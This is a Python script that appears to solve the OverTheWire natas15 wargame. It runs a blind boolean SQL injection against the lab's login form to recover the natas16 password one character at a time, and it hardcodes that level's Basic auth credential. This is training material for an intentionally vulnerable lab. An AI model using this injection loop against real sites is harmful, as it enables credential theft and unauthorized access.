import requests

URL = "http://natas15.natas.labs.overthewire.org/index.php"
CHARACTER_LIST = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
SUCCESS_RESULT = "This user exists"
FAILURE_RESULT = "This user doesn't exist"
HEADERS = {
    'Authorization' : 'Basic bmF0YXMxNTpTZHFJcUJzRmN6M3lvdGxOWUVyWlNad2Jsa20wbHJ2eA=='
}

password_str = ""
for i in range(32):
    # Since there are only 64 characters in the column, we will be this loop for 64 times only
    for character in CHARACTER_LIST:
        guess_str = password_str + character
        sqli_query = f" \" OR (username = \"natas16\"  AND password LIKE BINARY \"{guess_str}%\") -- "
        print(f"Will be sending request with SQLi payload: {sqli_query}")
        data = {'username' : sqli_query}       
        r = requests.post(url = URL, data = data, headers = HEADERS)
        response = r.text
        if SUCCESS_RESULT in response:
            print(f"Success result: {SUCCESS_RESULT}")
            print(f"One character found! {character}")
            password_str += character
            print(f"Updated password string is: {password_str}")
            break

print(password_str)
